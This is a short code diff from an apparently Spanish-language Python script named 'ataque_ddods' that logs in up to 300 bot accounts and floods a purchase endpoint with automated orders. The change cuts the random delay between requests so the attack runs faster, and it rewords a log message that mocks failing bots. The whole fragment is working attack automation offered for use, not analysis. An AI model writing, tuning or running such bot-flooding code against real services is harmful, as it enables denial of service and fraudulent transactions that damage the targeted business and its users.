@@ -38,7 +38,7 @@ def ataque_ddods(cantidad_bots=300):
         res_token = requests.post(URL_TOKEN, json={"username": username_bot, "password": password_bot})
         
         if res_token.status_code != 200:
-            print(f"[{i}/{cantidad_bots}] Es tonto, {username_bot}: {res_token.text}")
+            print(f"{username_bot} es tonto: {res_token.text}")
             continue
             
         token = res_token.json().get('access')
@@ -51,7 +51,7 @@ def ataque_ddods(cantidad_bots=300):
         }
         
         requests.post(URL_COMPRA, json=payload, headers=headers)
-        time.sleep(random.uniform(0.5,2.0))
+        time.sleep(random.uniform(0.3,1.0))
 
 if __name__ == "__main__":
     ataque_ddods()
